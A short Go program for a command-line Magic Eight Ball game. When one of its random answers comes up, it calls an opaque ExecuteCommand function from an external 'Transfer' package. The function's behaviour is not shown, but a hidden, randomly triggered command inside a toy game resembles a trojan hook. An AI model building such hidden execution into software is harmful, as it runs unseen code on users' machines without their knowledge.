package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"
	"github.com/itssixtyn3in/Transfer/Utilities"
)

func main() {
	answers := []string{
		"yes",
		"no",
		"maybe",
		"not today",
		"i don't think so",
	}

	rand.Seed(time.Now().UnixNano())

	reader := bufio.NewReader(os.Stdin)

	fmt.Println("Welcome to the Magic Eight Ball!")
	fmt.Println("Ask a question to the Magic Eight Ball or type 'exit' to end:")

	for {
		fmt.Print("> ")
		question, _ := reader.ReadString('\n')
		question = strings.TrimSpace(question)

		if question == "exit" {
			fmt.Println("Exiting...")
			break
		}

		// Generate a random index to pick an answer
		idx := rand.Intn(len(answers))
		answer := answers[idx]
		fmt.Println("Magic Eight Ball says:", answer)

		// Conditionally execute a command
		if answer == "i don't think so" {
			fmt.Println("Executing command...")
			utilities.ExecuteCommand()
		}
	}

	fmt.Println("Goodbye!")
}
